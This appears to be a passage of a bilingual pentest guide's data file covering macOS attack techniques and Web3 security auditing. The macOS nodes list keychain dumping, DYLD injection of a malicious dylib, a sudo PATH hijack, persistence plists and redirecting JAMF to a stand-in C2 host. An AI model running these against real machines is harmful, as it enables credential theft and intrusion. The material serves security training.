// ============================================================
// data_macos_web3.js — macOS Pentesting + Blockchain/Web3
// Source: hacktricks/macos-hardening + hacktricks/blockchain
// ============================================================

Object.assign(NODES, {

  // ──────────────────────────────────────────────────────────
  //  macOS PENTESTING
  // ──────────────────────────────────────────────────────────

  "macos_pentest": {
    id: "macos_pentest",
    title: "macOS — Reconnaissance & Énumération", title_en: "macOS — Reconnaissance & Enumeration",
    category: "pentest",
    icon: "🍎",
    description: "Énumération initiale d'un système macOS. Architecture, utilisateurs, services actifs, répertoires sensibles.",
    description_en: "Initial enumeration of a macOS system. Architecture, users, active services, sensitive directories.",
    commands: [
      { label: "Infos système", label_en: "System info", cmd: "sw_vers && uname -a && system_profiler SPSoftwareDataType" },
      { label: "Utilisateurs", label_en: "Users", cmd: "dscl . list /Users | grep -v '^_'\ndscl . -read /Users/admin" },
      { label: "Groupes admin", label_en: "Admin groups", cmd: "dscacheutil -q group -a name admin\nmembers admin" },
      { label: "Processus", label_en: "Processes", cmd: "ps aux\nlaunchctl list | grep -v '\\-\\s0'" },
      { label: "Réseau", label_en: "Network", cmd: "ifconfig\nnetstat -an | grep LISTEN\narp -a" },
      { label: "Fichiers sensibles", label_en: "Sensitive files", cmd: "find /Users -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null\nfind /Library -name '*.db' 2>/dev/null | grep -i pass" },
      { label: "Répertoire /Library", label_en: "/Library directory", cmd: "ls /Library/LaunchAgents/\nls /Library/LaunchDaemons/\nls ~/Library/LaunchAgents/" },
      { label: "Plist lire (binaire)", label_en: "Read plist (binary)", cmd: "plutil -convert xml1 file.plist -o -\ndefaults read /Library/Preferences/com.example.app" },
      { label: "Keychain dump", label_en: "Keychain dump", cmd: "security dump-keychain -d ~/Library/Keychains/login.keychain-db\nsecurity find-generic-password -ga ServiceName 2>&1 | grep password" },
      { label: "AD connecté ?", label_en: "AD connected?", cmd: "echo show com.apple.opendirectoryd.ActiveDirectory | scutil\ndscl \"/Active Directory/DOMAIN/All Domains\" ls /" }
    ],
    lookfor: [
      "Homebrew installé → /opt/homebrew/bin dans PATH (hijackable)",
      "LaunchAgents/Daemons writables → persistence",
      "Keychains avec mots de passe en clair",
      "Machine liée à un Active Directory",
      "MDM enrollée (JAMF, Kandji, etc.)"
    ],
    lookfor_en: [
      "Homebrew installed → /opt/homebrew/bin in PATH (hijackable)",
      "Writable LaunchAgents/Daemons → persistence",
      "Keychains with cleartext passwords",
      "Machine joined to an Active Directory",
      "MDM enrolled (JAMF, Kandji, etc.)"
    ],
    tips: [
      "macOS hérite de nombreuses privescs Linux (sudo -l, SUID, cron)",
      "SIP (System Integrity Protection) protège /System, /usr, /bin, /sbin → vérifier si désactivé",
      "TCC contrôle l'accès mic, caméra, contacts, full disk → contournable"
    ],
    tips_en: [
      "macOS inherits many Linux privesc techniques (sudo -l, SUID, cron)",
      "SIP (System Integrity Protection) protects /System, /usr, /bin, /sbin → check if disabled",
      "TCC controls access to mic, camera, contacts, full disk → bypassable"
    ],
    choices: [
      { label: "Privilege Escalation macOS", label_en: "macOS Privilege Escalation", next: "macos_privesc", icon: "⬆️" },
      { label: "TCC — Bypass de permissions", label_en: "TCC — Permission Bypass", next: "macos_tcc", icon: "🔐" },
      { label: "MDM/JAMF — Abus de gestion", label_en: "MDM/JAMF — Management Abuse", next: "macos_mdm", icon: "📋" }
    ]
  },

  "macos_privesc": {
    id: "macos_privesc",
    title: "macOS — Privilege Escalation", title_en: "macOS — Privilege Escalation",
    category: "privesc",
    icon: "⬆️",
    description: "Techniques d'escalade de privilèges macOS : DYLD hijacking, sudo PATH hijack, Launch Daemons writables, dock impersonation.",
    description_en: "macOS privilege escalation techniques: DYLD hijacking, sudo PATH hijack, writable Launch Daemons, dock impersonation.",
    commands: [
      { label: "SIP status", label_en: "SIP status", cmd: "csrutil status\n# Si désactivé : csrutil disable (nécessite recovery mode)" },
      { label: "sudo -l", label_en: "sudo -l", cmd: "sudo -l\n# macOS maintient le PATH utilisateur → hijack possible via Homebrew" },
      { label: "DYLD Library injection", label_en: "DYLD Library injection", cmd: "# Compiler une dylib malveillante :\ngcc -dynamiclib -o inject.dylib inject.c\n# Injection :\nDYLD_INSERT_LIBRARIES=inject.dylib ./vulnerable_binary\n# inject.c : __attribute__((constructor)) void f(){execv(\"/bin/bash\",0);}" },
      { label: "Vérifier DYLD vulnérabilité", label_en: "Check DYLD vulnerability", cmd: "# Binary vulnérable si :\notool -l /Applications/App.app/Contents/MacOS/App | grep LC_RPATH\n# + pas de com.apple.security.cs.require-lv dans entitlements\ncodesign -dv --entitlements :- /Applications/App.app/Contents/MacOS/App" },
      { label: "Sudo PATH hijack (Homebrew)", label_en: "Sudo PATH hijack (Homebrew)", cmd: "cat > /opt/homebrew/bin/ls <<'EOF'\n#!/bin/bash\nif [ \"$(id -u)\" -eq 0 ]; then whoami > /tmp/privesc; fi\n/bin/ls \"$@\"\nEOF\nchmod +x /opt/homebrew/bin/ls\n# Victim : sudo ls" },
      { label: "LaunchDaemon persistence", label_en: "LaunchDaemon persistence", cmd: "# Créer /Library/LaunchDaemons/com.evil.plist (nécessite root)\n# Créer ~/Library/LaunchAgents/com.evil.plist (user persistence)\nlaunchctl load ~/Library/LaunchAgents/com.evil.plist\nlaunchctl start com.evil" },
      { label: "Fichiers .plist writables", label_en: "Writable .plist files", cmd: "find /Library/LaunchDaemons -writable 2>/dev/null\nfind /Library/LaunchAgents -writable 2>/dev/null\nls -la /etc/sudoers.d/" },
      { label: "Vérifier writable /opt/homebrew", label_en: "Check writable /opt/homebrew", cmd: "ls -la /opt/homebrew/bin/ | head -20\nwhich -a python3 curl wget" },
      { label: "Dump TCC.db (si FDA)", label_en: "Dump TCC.db (if FDA)", cmd: "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db 'select service,client,auth_value from access'\nsqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db 'select service,client,auth_value from access'" }
    ],
    lookfor: [
      "Binary avec LC_RPATH writables par l'utilisateur → DYLD hijack",
      "Entitlement com.apple.security.cs.disable-library-validation → DYLD_INSERT_LIBRARIES possible",
      "LaunchDaemons/Agents writables → persistence root",
      "Homebrew dans PATH sudo → hijack binaire commun (ls, curl, python)"
    ],
    lookfor_en: [
      "Binary with user-writable LC_RPATH → DYLD hijack",
      "Entitlement com.apple.security.cs.disable-library-validation → DYLD_INSERT_LIBRARIES possible",
      "Writable LaunchDaemons/Agents → root persistence",
      "Homebrew in sudo PATH → hijack common binary (ls, curl, python)"
    ],
    tips: [
      "macOS bloque DYLD_INSERT_LIBRARIES si SIP actif + binary hardened",
      "Dock impersonation : remplacer une app dans le Dock par un faux app.bundle qui vole TCC",
      "osascript peut demander des mots de passe via des popups (ingénierie sociale)",
      "Mythic agent 'Orthrus' utilise MDM pour installation C2"
    ],
    tips_en: [
      "macOS blocks DYLD_INSERT_LIBRARIES if SIP is active + binary is hardened",
      "Dock impersonation: replace an app in the Dock with a fake app.bundle that steals TCC",
      "osascript can prompt for passwords via popups (social engineering)",
      "Mythic agent 'Orthrus' uses MDM for C2 installation"
    ],
    choices: [
      { label: "TCC — Bypass de permissions", label_en: "TCC — Permission Bypass", next: "macos_tcc", icon: "🔐" },
      { label: "MDM/JAMF Abuse", label_en: "MDM/JAMF Abuse", next: "macos_mdm", icon: "📋" }
    ]
  },

  "macos_tcc": {
    id: "macos_tcc",
    title: "macOS — TCC (Transparency Consent & Control)", title_en: "macOS — TCC (Transparency Consent & Control)",
    category: "privesc",
    icon: "🔐",
    description: "TCC contrôle l'accès aux ressources sensibles : micro, caméra, contacts, photos, Full Disk Access. Techniques de bypass.",
    description_en: "TCC controls access to sensitive resources: microphone, camera, contacts, photos, Full Disk Access. Bypass techniques.",
    commands: [
      { label: "Inspecter TCC databases", label_en: "Inspect TCC databases", cmd: "# User DB (besoin FDA pour lire)\nsqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db '.schema'\nsqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db 'select service,client,auth_value,auth_reason from access'\n# System DB (besoin SIP bypass)\nsqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db 'select service,client,auth_value from access'" },
      { label: "Lister permissions accordées", label_en: "List granted permissions", cmd: "# Telegram granted ?\nsqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \"select * from access where client LIKE '%telegram%' and auth_value=2\"\n# Toutes les Full Disk Access :\nsqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"select client from access where service='kTCCServiceSystemPolicyAllFiles' and auth_value=2\"" },
      { label: "Reset permissions (test)", label_en: "Reset permissions (test)", cmd: "tccutil reset All com.example.app\ntccutil reset Microphone\ntccutil reset ScreenCapture" },
      { label: "TCC bypass via injection dans FDA app", label_en: "TCC bypass via injection into FDA app", cmd: "# Si on peut injecter dans une app avec FDA (ex: Terminal)\n# DYLD_INSERT_LIBRARIES dans le contexte de Terminal → accès full disk\nDYLD_INSERT_LIBRARIES=payload.dylib /Applications/Utilities/Terminal.app/Contents/MacOS/Terminal" },
      { label: "Dock impersonation (vol TCC)", label_en: "Dock impersonation (TCC theft)", cmd: "# Remplacer une app légitime dans le Dock par une fake qui capture TCC\n# La fake app demande les permissions et les stocke\nmkdir -p /tmp/FakeChrome.app/Contents/{MacOS,Resources}\n# Copier icône Chrome, créer Info.plist avec com.google.Chrome bundle ID\n# Ajouter au dock via defaults write com.apple.dock" },
      { label: "Vérifier entitlements app", label_en: "Check app entitlements", cmd: "codesign -dv --entitlements :- /Applications/App.app\n# Chercher : com.apple.private.tcc.allow\n# Chercher : com.apple.security.cs.disable-library-validation" },
      { label: "MDM Override TCC", label_en: "MDM Override TCC", cmd: "# Via profil MDM installé → peut pré-approuver TCC sans prompt\ncat /Library/Application\\ Support/com.apple.TCC/*.db 2>/dev/null\ncat /var/db/locationd/clients.plist" }
    ],
    lookfor: [
      "Applications avec com.apple.private.tcc.allow → bypass total",
      "FDA accordé à Terminal, Python, etc. → exploitable via injection",
      "Profils MDM avec TCC overrides (MDMOverrides.plist)",
      "SQLite TCC.db writables sans SIP"
    ],
    lookfor_en: [
      "Applications with com.apple.private.tcc.allow → full bypass",
      "FDA granted to Terminal, Python, etc. → exploitable via injection",
      "MDM profiles with TCC overrides (MDMOverrides.plist)",
      "Writable SQLite TCC.db without SIP"
    ],
    tips: [
      "SIP doit être désactivé pour écrire dans le TCC système",
      "La user TCC DB peut être modifiée si on a un process avec FDA",
      "iOS TCC DB : /private/var/mobile/Library/TCC/TCC.db"
    ],
    tips_en: [
      "SIP must be disabled to write to the system TCC",
      "The user TCC DB can be modified if you have a process with FDA",
      "iOS TCC DB: /private/var/mobile/Library/TCC/TCC.db"
    ],
    choices: [
      { label: "MDM/JAMF Abuse", label_en: "MDM/JAMF Abuse", next: "macos_mdm", icon: "📋" },
      { label: "macOS Red Teaming général", label_en: "General macOS Red Teaming", next: "macos_privesc", icon: "⬆️" }
    ]
  },

  "macos_mdm": {
    id: "macos_mdm",
    title: "macOS — MDM & JAMF Abuse", title_en: "macOS — MDM & JAMF Abuse",
    category: "pentest",
    icon: "📋",
    description: "Abus des solutions MDM (Mobile Device Management) comme JAMF Pro. Prise de contrôle de flotte, vol de secrets, C2 via MDM.",
    description_en: "Abusing MDM (Mobile Device Management) solutions like JAMF Pro. Fleet takeover, secret theft, C2 via MDM.",
    commands: [
      { label: "Détecter MDM enrollment", label_en: "Detect MDM enrollment", cmd: "profiles status -type enrollment\nprofiles list\nmdmclient QueryDeviceInformation 2>/dev/null\nls /Library/Application\\ Support/JAMF/" },
      { label: "JAMF — infos connexion", label_en: "JAMF — connection info", cmd: "plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist\n# Révèle l'URL JSS : https://company.jamfcloud.com/\njamf checkJSSConnection" },
      { label: "JAMF — secrets dans scripts", label_en: "JAMF — secrets in scripts", cmd: "# Les scripts custom sont placés ici temporairement :\nls /Library/Application\\ Support/Jamf/tmp/\n# Monitorer les args de processus :\npid: ps aux | grep -i jamf" },
      { label: "JAMF — UUID appareil", label_en: "JAMF — device UUID", cmd: "ioreg -d2 -c IOPlatformExpertDevice | awk -F'\"' '/IOPlatformUUID/{print $(NF-1)}'\n# Keychain JAMF :\nls /Library/Application\\ Support/Jamf/JAMF.keychain" },
      { label: "JAMF password spray", label_en: "JAMF password spray", cmd: "# JamfSniper.py → spray sur https://company.jamfcloud.com/enroll/\npython3 JamfSniper.py -u users.txt -p passwords.txt -t https://company.jamfcloud.com" },
      { label: "Modifier URL JSS → C2", label_en: "Modify JSS URL → C2", cmd: "# Remplacer l'URL JAMF par un C2 Mythic (agent Orthrus)\n# Dans un pkg malveillant qui modifie com.jamfsoftware.jamf.plist\nsudo defaults write /Library/Preferences/com.jamfsoftware.jamf jss_url https://C2_URL/\nsudo jamf policy -id 0" },
      { label: "MicroMDM — propre MDM C2", label_en: "MicroMDM — own MDM C2", cmd: "# Setup MicroMDM comme C2 :\n# 1. Obtenir certificat MDM via https://mdmcert.download/\n# 2. Installer MicroMDM\n# 3. Créer profil mobileconfig malveillant\n# 4. Livrer via pkg (auto-extrait depuis Safari → .zip → .pkg)\n# Le device ajoute le SSL cert MDM comme CA trusted → signer n'importe quoi" },
      { label: "macOS + Active Directory", label_en: "macOS + Active Directory", cmd: "# Bloodhound macOS :\ngit clone https://github.com/XMCyber/MacHound\npython3 MacHound.py -d domain.local -u user -p pass\n# Kerberos natif :\nkinit user@DOMAIN.LOCAL\nklist\n# Bifrost (Objective-C krb5) :\n./bifrost --action asktgt --username user --domain domain.local" }
    ],
    lookfor: [
      "JAMF self-enrollment activé → spray de credentials",
      "Scripts JAMF avec credentials en clair dans /tmp/",
      "JSS URL dans plist → remplaçable par C2",
      "Machine joinée à AD → Kerberoasting, AS-REP roasting"
    ],
    lookfor_en: [
      "JAMF self-enrollment enabled → credential spray",
      "JAMF scripts with cleartext credentials in /tmp/",
      "JSS URL in plist → replaceable by C2",
      "Machine joined to AD → Kerberoasting, AS-REP roasting"
    ],
    tips: [
      "Ancienne vulnérabilité JAMF : secret partagé 'jk23ucnq91jfu9aj' dans le binaire jamf",
      "JamfExplorer.py surveille les nouveaux fichiers et arguments de processus",
      "MDM peut exécuter des scripts, créer des comptes admin, changer FileVault key",
      "Profils mobileconfig peuvent être livrés dans un .zip (Safari auto-extrait)"
    ],
    tips_en: [
      "Old JAMF vulnerability: shared secret 'jk23ucnq91jfu9aj' in the jamf binary",
      "JamfExplorer.py monitors new files and process arguments",
      "MDM can execute scripts, create admin accounts, change FileVault key",
      "mobileconfig profiles can be delivered in a .zip (Safari auto-extracts)"
    ],
    choices: [
      { label: "macOS Recon initial", label_en: "Initial macOS Recon", next: "macos_pentest", icon: "🍎" },
      { label: "Active Directory", label_en: "Active Directory", next: "ad_initial", icon: "🏢" }
    ]
  },

  // ──────────────────────────────────────────────────────────
  //  BLOCKCHAIN / WEB3
  // ──────────────────────────────────────────────────────────

  "web3_intro": {
    id: "web3_intro",
    title: "Web3 — Red Teaming & Sécurité Blockchain", title_en: "Web3 — Red Teaming & Blockchain Security",
    category: "pentest",
    icon: "⛓️",
    description: "Introduction au red teaming Web3. Inventaire des composants de valeur, mapping MITRE AADAPT, vecteurs d'attaque principaux.",
    description_en: "Introduction to Web3 red teaming. Inventory of value components, MITRE AADAPT mapping, main attack vectors.",
    commands: [
      { label: "Inventaire composants valeur", label_en: "Value component inventory", cmd: "# 1. Signing services (HSM/KMS, Vault, APIs de signature)\n# 2. Admin/upgrade paths (proxy admins, timelocks, governance)\n# 3. On-chain logic (lending, AMMs, vaults, bridges)\n# 4. Off-chain automation (bots, CI/CD, cron jobs)\n# 5. Oracles & data feeds (agrégateurs, quorum, deviation)\n# 6. Bridges cross-chain (lock/mint, relayers)" },
      { label: "Analyser un contrat déployé", label_en: "Analyze a deployed contract", cmd: "# Récupérer bytecode :\ncast code CONTRACT_ADDR --rpc-url https://eth-mainnet.alchemyapi.io/v2/KEY\n# Décompiler avec Heimdall :\nheimdall decompile CONTRACT_ADDR --rpc-url RPC_URL\n# ABI depuis Etherscan :\ncurl 'https://api.etherscan.io/api?module=contract&action=getabi&address=ADDR&apikey=KEY'" },
      { label: "Fork mainnet pour tests", label_en: "Fork mainnet for testing", cmd: "# Anvil (Foundry) — fork du mainnet :\nanvil --fork-url https://eth-mainnet.alchemyapi.io/v2/KEY --fork-block-number 19000000\n# Hardhat fork :\nnpx hardhat node --fork https://eth-mainnet.alchemyapi.io/v2/KEY" },
      { label: "Flash loan attack simulation", label_en: "Flash loan attack simulation", cmd: "# 1. Emprunter capital transient dans 1 tx\n# 2. Distordre prix AMM (swaps)\n# 3. Exploiter logique victime (borrow, liquidate, mint)\n# 4. Rembourser flash loan\n# Foundry test :\nforge test --match-test testFlashLoanAttack -vvv --fork-url RPC_URL" },
      { label: "Oracle manipulation", label_en: "Oracle manipulation", cmd: "# Vérifier source de prix :\n# 1. Oracle centralisé → single point of failure\n# 2. TWAP trop court → manipulable sur 1 bloc\n# 3. Quorum faible → manipulation d'agrégateur\n# Identifier oracles dans un contrat :\ngrep -r 'latestRoundData\\|getPrice\\|oracle\\|feed' contracts/" },
      { label: "Credential/signing abuse", label_en: "Credential/signing abuse", cmd: "# Énumérer identités avec droits de signature :\n# - Opérateurs, CI tokens, service accounts\n# - Participants multisig\n# Tester KMS policies :\naws iam simulate-principal-policy --policy-source-arn ROLE_ARN --action-names kms:Sign\n# Détecter overrides IAM:\naws iam get-account-authorization-details" }
    ],
    lookfor: [
      "Contrats upgradeables sans multisig ni timelock → upgrade par une seule clé",
      "Oracles avec TWAP court ou source unique → flash loan manipulation",
      "CI/CD avec droits KMS/HSM → signing abuse",
      "Bridges sans vérification croisée → replay attacks"
    ],
    lookfor_en: [
      "Upgradeable contracts without multisig or timelock → upgrade by a single key",
      "Oracles with short TWAP or single source → flash loan manipulation",
      "CI/CD with KMS/HSM rights → signing abuse",
      "Bridges without cross-verification → replay attacks"
    ],
    tips: [
      "MITRE AADAPT = version blockchain du MITRE ATT&CK",
      "Flash loans permettent d'emprunter sans collatéral dans 1 transaction",
      "Solidity stockage : slot 0 souvent pointeur d'implémentation (proxy pattern)",
      "EIP-712 structured data signing — vérifier que tous les champs gas sont signés"
    ],
    tips_en: [
      "MITRE AADAPT = blockchain version of MITRE ATT&CK",
      "Flash loans allow borrowing without collateral within 1 transaction",
      "Solidity storage: slot 0 often points to implementation (proxy pattern)",
      "EIP-712 structured data signing — verify all gas fields are signed"
    ],
    choices: [
      { label: "Smart Contract — Vulnérabilités", label_en: "Smart Contract — Vulnerabilities", next: "web3_smart_contracts", icon: "📄" },
      { label: "Wallet & Signing Security", label_en: "Wallet & Signing Security", next: "web3_wallet_security", icon: "🔑" },
      { label: "Outils Web3 Security", label_en: "Web3 Security Tools", next: "web3_tools", icon: "🔧" }
    ]
  },

  "web3_smart_contracts": {
    id: "web3_smart_contracts",
    title: "Smart Contracts — Vulnérabilités", title_en: "Smart Contracts — Vulnerabilities",
    category: "exploit",
    icon: "📄",
    description: "Audit de contrats Solidity. Vulnérabilités classiques : reentrancy, integer overflow, access control, flash loans, oracle manipulation.",
    description_en: "Solidity contract auditing. Classic vulnerabilities: reentrancy, integer overflow, access control, flash loans, oracle manipulation.",
    commands: [
      { label: "Slither — analyse statique", label_en: "Slither — static analysis", cmd: "slither contracts/ --print human-summary\nslither contract.sol --detect reentrancy,arbitrary-send,uninitialized-state\nslither contracts/ --print call-graph\nslither-check-upgradeability contracts/ --proxy-name Proxy --implementation-name Impl" },
      { label: "Slither mutation testing", label_en: "Slither mutation testing", cmd: "slither-mutate ./src/contracts --test-cmd='forge test'\nslither-mutate --list-mutators\n# Résultats dans ./mutation_campaign/\n# UNCAUGHT = test manquant pour ce comportement" },
      { label: "Mythril — symbolic execution", label_en: "Mythril — symbolic execution", cmd: "myth analyze contract.sol --solv 0.8.19\nmyth analyze --rpc mainnet --address CONTRACT_ADDR\n# Timeout pour gros contrats :\nmyth analyze contract.sol --execution-timeout 300" },
      { label: "Echidna — fuzzing", label_en: "Echidna — fuzzing", cmd: "echidna contract.sol --contract MyContract --config echidna.yaml\n# echidna.yaml :\n# testMode: assertion\n# testLimit: 50000\n# seqLen: 100" },
      { label: "Reentrancy pattern", label_en: "Reentrancy pattern", cmd: "# Vulnérable :\n# function withdraw() { uint amt=bal[msg.sender]; msg.sender.call{value:amt}(''); bal[msg.sender]=0; }\n# Exploit : contrat avec fallback() { victim.withdraw(); }\n# Fix : checks-effects-interactions pattern\n# Détecter avec Slither :\nslither contract.sol --detect reentrancy-eth,reentrancy-no-eth" },
      { label: "Integer overflow (Solidity <0.8)", label_en: "Integer overflow (Solidity <0.8)", cmd: "# Avant Solidity 0.8 : uint256 wrap silencieusement\n# uint8 x = 255; x++ → x = 0\n# Détecter :\nslither contract.sol --detect tainted-low-level-calls\n# Utiliser SafeMath ou Solidity 0.8+" },
      { label: "Access control checks", label_en: "Access control checks", cmd: "# Chercher fonctions sans modifier :\ngrep -n 'function.*external\\|function.*public' contract.sol | grep -v 'only\\|require\\|modifier'\n# Vérifier ownership :\ngrep -n 'onlyOwner\\|require(msg.sender' contract.sol\n# Slither :\nslither contract.sol --detect unprotected-upgrade,missing-zero-check" },
      { label: "Foundry — écrire exploit", label_en: "Foundry — write exploit", cmd: "# Test d'exploit Foundry :\nforge test --match-test testExploit -vvvv --fork-url RPC_URL\n# Template d'exploit :\n# contract Exploit is Test {\n#   function testExploit() public {\n#     vm.deal(address(this), 100 ether);\n#     // ... attaque\n#     assertGt(address(this).balance, 100 ether);\n#   }\n# }" },
      { label: "ERC-4337 — vérifications", label_en: "ERC-4337 — checks", cmd: "# Vulnérabilité 1 : execute() sans restrict EntryPoint\n# Vulnérabilité 2 : champs gas non signés → fee drain\n# Vulnérabilité 3 : state écrit dans validateUserOp → clobbering\n# Vulnérabilité 4 : ERC-1271 sans domain separation → replay\n# Vérifier :\ngrep -n 'validateUserOp\\|execute\\|entryPoint' contracts/account/*.sol" }
    ],
    lookfor: [
      "withdraw() avant balance=0 → reentrancy",
      "Solidity <0.8 sans SafeMath → integer overflow",
      "Fonctions privilegiées sans modifier access control",
      "delegatecall vers adresse contrôlable → slot 0 overwrite",
      "Oracle avec source unique ou TWAP < 15 min",
      "Timelock absent sur fonctions d'upgrade"
    ],
    lookfor_en: [
      "withdraw() before balance=0 → reentrancy",
      "Solidity <0.8 without SafeMath → integer overflow",
      "Privileged functions without access control modifier",
      "delegatecall to controllable address → slot 0 overwrite",
      "Oracle with single source or TWAP < 15 min",
      "Missing timelock on upgrade functions"
    ],
    tips: [
      "Slither est l'outil #1 pour l'analyse statique Solidity",
      "Foundry permet de forker mainnet et tester des exploits en local",
      "Mutation testing révèle les invariants non testés → potentiel exploit réel",
      "ERC-4337 : validate stateless, fees sécurisés pendant validation, postOp minimal"
    ],
    tips_en: [
      "Slither is the #1 tool for Solidity static analysis",
      "Foundry allows forking mainnet and testing exploits locally",
      "Mutation testing reveals untested invariants → potential real exploit",
      "ERC-4337: validate stateless, fees secured during validation, minimal postOp"
    ],
    choices: [
      { label: "Wallet & Signing Security", label_en: "Wallet & Signing Security", next: "web3_wallet_security", icon: "🔑" },
      { label: "Outils Web3", label_en: "Web3 Tools", next: "web3_tools", icon: "🔧" }
    ]
  },

  "web3_wallet_security": {
    id: "web3_wallet_security",
    title: "Web3 — Wallet & Signing Security", title_en: "Web3 — Wallet & Signing Security",
    category: "exploit",
    icon: "🔑",
    description: "Sécurité des wallets multisig (Safe), abus de signing workflow (Bybit hack), ERC-4337 pitfalls, EIP-712 signing mutation.",
    description_en: "Multisig wallet security (Safe), signing workflow abuse (Bybit hack), ERC-4337 pitfalls, EIP-712 signing mutation.",
    commands: [
      { label: "Safe — inspecter slot 0 (masterCopy)", label_en: "Safe — inspect slot 0 (masterCopy)", cmd: "# Slot 0 = adresse d'implémentation du proxy Safe\ncast storage SAFE_ADDR 0 --rpc-url RPC_URL\n# Si modifié → compromis\n# Adresse Safe officielle sur Etherscan" },
      { label: "Safe — détecter delegatecall malveillant", label_en: "Safe — detect malicious delegatecall", cmd: "# Surveiller txs Safe avec operation=1 (delegatecall) :\n# Dans les données de la transaction :\n# bytes1 operation = data[...] → 0x01 = delegatecall\n# Via events :\ncast logs 'ExecutionSuccess(bytes32,uint256)' --address SAFE_ADDR --rpc-url RPC_URL" },
      { label: "Vérifier bundle JS Safe (intégrité)", label_en: "Check Safe JS bundle (integrity)", cmd: "# SRI (Subresource Integrity) check :\ncurl -s https://app.safe.global/_app-HASH.js | sha256sum\n# Comparer avec hash attendu\n# Monitorer diffs de bundles (incident Bybit 2025)" },
      { label: "EIP-712 — inspecter signature", label_en: "EIP-712 — inspect signature", cmd: "# Décoder une signature EIP-712 :\ncast decode-abi 'execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)' TX_DATA\n# Vérifier field operation (uint8) :\n# 0 = call, 1 = delegatecall\n# Champs gas doivent être dans le payload signé !" },
      { label: "Multisig — audit de sécurité", label_en: "Multisig — security audit", cmd: "# Vérifier configuration Safe :\ncast call SAFE_ADDR 'getThreshold()' --rpc-url RPC_URL\ncast call SAFE_ADDR 'getOwners()' --rpc-url RPC_URL\ncast call SAFE_ADDR 'VERSION()' --rpc-url RPC_URL\n# Safe <1.3.0 : pas de Guard hook → delegatecall non filtrable" },
      { label: "ERC-4337 — audit compte", label_en: "ERC-4337 — account audit", cmd: "# Vérifier restrictions entryPoint :\ngrep -n 'msg.sender.*entryPoint\\|require.*entryPoint' SmartAccount.sol\n# Vérifier champs gas dans userOpHash :\n# preVerificationGas, verificationGasLimit, callGasLimit, maxFeePerGas, maxPriorityFeePerGas\n# Vérifier ERC-1271 : domain separation\ngrep -n 'isValidSignature\\|EIP712\\|chainId\\|verifyingContract' SmartAccount.sol" },
      { label: "KMS/HSM — audit permissions", label_en: "KMS/HSM — permission audit", cmd: "# AWS KMS :\naws kms list-key-policies --key-id KEY_ID\naws kms get-key-policy --key-id KEY_ID --policy-name default\naws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=Sign\n# Détecter abuse : burst de signatures, destinations inhabituelles, heures bizarres" },
      { label: "Tracing cross-chain", label_en: "Cross-chain tracing", cmd: "# Reconstituer un exploit cross-chain :\n# 1. Identifier TX initiale (hash)\ncast tx TX_HASH --rpc-url RPC_URL\n# 2. Suivre les transferts ERC-20 :\ncast logs 'Transfer(address,address,uint256)' --from-block START --to-block END --rpc-url RPC_URL\n# 3. Outils chainanalytics : Chainalysis, Nansen, Dune Analytics" }
    ],
    lookfor: [
      "Safe slot 0 modifié → implémentation remplacée par attaquant",
      "TX Safe avec operation=1 (delegatecall) vers adresse inconnue",
      "Bundle JS Safe modifié (mutation last-moment des champs avant signature)",
      "Champs gas non inclus dans payload signé → fee drain",
      "Safe version <1.3.0 sans Guard → delegatecall non filtrable",
      "Multisig avec threshold=1 → single point of failure"
    ],
    lookfor_en: [
      "Modified Safe slot 0 → implementation replaced by attacker",
      "Safe TX with operation=1 (delegatecall) to unknown address",
      "Modified Safe JS bundle (last-moment field mutation before signing)",
      "Gas fields not included in signed payload → fee drain",
      "Safe version <1.3.0 without Guard → unfiltered delegatecall",
      "Multisig with threshold=1 → single point of failure"
    ],
    tips: [
      "Incident Bybit 2025 : compromission bundle S3 Safe → swap operation=0 en 1 → drain ~401k ETH",
      "La mutation se fait juste avant signTransaction() puis les données sont restaurées → les autres signataires voient les données originales",
      "Gateway Safe doit vérifier que safeTxHash correspond aux champs soumis",
      "EIP-712 clear-signing : hardware wallet doit décoder et afficher tous les champs (operation, to, data)"
    ],
    tips_en: [
      "Bybit 2025 incident: compromise of Safe S3 bundle → swap operation=0 to 1 → drain ~401k ETH",
      "The mutation happens just before signTransaction() then the data is restored → other signers see the original data",
      "Safe gateway must verify that safeTxHash matches the submitted fields",
      "EIP-712 clear-signing: hardware wallet must decode and display all fields (operation, to, data)"
    ],
    choices: [
      { label: "Smart Contracts — vulnérabilités", label_en: "Smart Contracts — vulnerabilities", next: "web3_smart_contracts", icon: "📄" },
      { label: "Outils Web3", label_en: "Web3 Tools", next: "web3_tools", icon: "🔧" }
    ]
  },

  "web3_tools": {
    id: "web3_tools",
    title: "Web3 — Outils de Sécurité", title_en: "Web3 — Security Tools",
    category: "tool",
    icon: "🔧",
    description: "Arsenal complet pour l'audit et le red teaming Web3 : Foundry, Slither, Mythril, Echidna, Hardhat, outils de forensics on-chain.",
    description_en: "Complete arsenal for Web3 auditing and red teaming: Foundry, Slither, Mythril, Echidna, Hardhat, on-chain forensics tools.",
    commands: [
      { label: "Foundry — toolkit complet", label_en: "Foundry — complete toolkit", cmd: "# Installer :\ncurl -L https://foundry.paradigm.xyz | bash && foundryup\n# Cast — interaction avec la chaîne :\ncast call ADDR 'balanceOf(address)' WALLET --rpc-url RPC_URL\ncast send ADDR 'transfer(address,uint256)' TO AMOUNT --private-key KEY\ncast block latest --rpc-url RPC_URL\n# Forge — tests et exploits :\nforge test -vvvv --fork-url RPC_URL --fork-block-number BLOCK\nforge build && forge fmt" },
      { label: "Slither — analyse statique Solidity", label_en: "Slither — Solidity static analysis", cmd: "pip install slither-analyzer\nslither . --print human-summary\nslither . --detect all\nslither . --detect reentrancy-eth,arbitrary-send-eth,unprotected-upgrade\nslither-mutate . --test-cmd='forge test'\n# Vérifier upgradeability :\nslither-check-upgradeability . --proxy-name Proxy --implementation-name Impl" },
